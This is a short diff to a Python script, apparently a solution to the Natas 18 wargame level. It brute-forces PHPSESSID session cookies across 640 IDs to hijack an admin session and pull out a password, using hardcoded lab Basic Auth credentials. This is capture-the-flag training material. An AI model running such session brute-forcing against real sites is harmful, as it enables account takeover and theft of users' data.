@@ -11,8 +11,8 @@ userAndPass = b64encode(b"natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP").decode("asc
 headers = {'Authorization': 'Basic %s' % userAndPass}
 
 
-def doRequest(username, sessionid):
-    res = requests.post(url, headers=headers, data={'username': username}, cookies={'PHPSESSID': str(sessionid)})
+def injectCookie(username, sessionid):
+    res = requests.get(url, headers=headers, data={'username': username}, cookies={'PHPSESSID': str(sessionid)})
     return res.text
 
 
@@ -20,7 +20,7 @@ while idx < 640:
     idx += 1
     print("looking for %i" % idx)
 
-    text = doRequest('natas18', idx).splitlines()
+    text = injectCookie('natas18', idx).splitlines()
     debugs = [line for line in text if re.search(r'Password: ', line)]
     print(debugs)
 
